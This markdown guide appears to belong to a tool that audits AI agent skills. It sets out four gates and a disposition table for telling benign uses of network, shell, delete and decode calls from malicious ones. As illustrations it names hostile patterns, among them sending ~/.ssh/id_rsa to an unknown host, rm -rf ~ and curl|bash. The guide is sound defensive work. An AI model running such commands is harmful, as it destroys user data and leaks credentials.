# False-Positive Handling (dual-use disambiguation)

Most signatures in `threat-taxonomy.md` are **dual-use**: `requests`, `subprocess`, `rm`,
`fetch`, `base64`. A legitimate skill uses them too. A finding is only escalated above `low`
when it survives **all four gates**. Reviewers cite the *correlation* (source→sink,
capability vs declaration), never the lone token.

## The four gates

1. **Necessity** — does the skill's *stated function* require this capability at all? A
   markdown formatter needs no network and no credentials → any egress is immediately
   suspicious. A "deploy to S3" skill needs `boto3` upload → expected.

2. **Disclosure** — is the capability described in `description`/prose, so the user would not
   be surprised? (Lack of Surprise is literally a disclosure test.) Disclosed + necessary →
   downgrade. Undisclosed → escalate.

3. **Declared scope** (`allowed-tools`, `metadata.requires.bins`) — does the frontmatter
   authorize this? Code exceeding its own declared tools/bins is an `intent_mismatch` and
   escalates **regardless of disclosure**.

4. **Target & data-flow** — *what* does it touch and *where does it go*? `rm -rf "$WORKDIR/tmp"`
   (skill-local) ≠ `rm -rf ~`. `requests.post(api, data=task_input)` to the declared service ≠
   `requests.post(unknown, data=open('~/.ssh/id_rsa').read())`. **Egress of sensitive sources
   to undeclared sinks is the decisive escalation** — the pairing, not the primitive.

## Standing dual-use disposition table

| Pattern | Legitimate when… | Malicious when… |
|---|---|---|
| `requests.post` / `fetch` | destination = the skill's own declared service, body = task data, disclosed | undisclosed host, body = file/env/cred contents, or fires at trigger-time |
| `subprocess` / `os.system` | runs a declared tool on task inputs, args not attacker-fixed | `shell=True` with interpolated remote content, or runs `curl\|bash` |
| `rm` / `Remove-Item` / `os.remove` | path scoped to skill workspace/temp, part of stated cleanup | targets `~`, `/`, system dirs, or a `$VAR` resolving outside the workspace |
| `base64` / `eval` / `IEX` | decodes a declared data asset with an explaining comment | decodes then executes; opaque blob; no explanation |
| reads `.env` / creds | the skill's job is literally managing those (and says so) | read then sent off-box, or unrelated to the stated purpose |
| broad `glob` / `os.walk` | processes a directory the user pointed at | walks `$HOME` then transmits, or far broader than the task |
| network in a `lark-*`/research/deploy skill | hits its declared API with task data | hits an undisclosed third-party host, or uploads local files |

## Anti-overfitting rule

- Absence of a keyword is **not** absence of risk (judgment signals exist).
- Presence of a keyword is **not** proof of malice (dual-use).
- When uncertain, **lower confidence, not severity.** The verdict gate routes a
  low-confidence-but-severe finding to WARN (a human decides) instead of BLOCK — this controls
  false positives without hiding real risk.
- The report's "Cleared / dual-use" section must *show its work*: name each dangerous-looking
  pattern that was cleared and why (which gate it passed). Justifying clears is what builds
  user trust and keeps the auditor from crying wolf.
